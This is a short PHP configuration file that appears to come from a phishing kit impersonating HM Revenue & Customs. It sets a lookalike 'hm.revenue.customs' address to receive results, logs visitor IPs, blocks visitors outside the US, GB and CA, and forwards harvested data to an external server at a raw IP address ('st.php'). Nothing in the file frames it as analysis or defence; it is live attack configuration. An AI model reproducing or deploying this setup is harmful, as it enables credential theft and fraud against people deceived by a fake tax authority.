<?php

$send="hm.revenue.customs.services@safetechltd.co.uk";


$pageonline=1; //   feature On (1) and off (0) toggle

$country_block=1; //This will only allow CA visitors
$allowed_countries=array("US","GB","CA"); // Enter here the countries standard 2-character codes to allow them.
$ip_logger=1; //   feature On (1) and off (0) toggle
$email_feature=0;  // feature On (1) and off (0) toggle
$log_feature=1;  // feature On (1) and off (0) toggle
$external_log=1; // feature On (1) and off (0) toggle

$external_link="http://185.234.218.161/st.php";  // Link for external server's st.php file







function randomCha($len)
{
	$str="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	$out="";
	for($i=0;$i<=$len;$i++)
	{
		$out.=$str[rand(0,51)];
	}
	return $out;
}


?>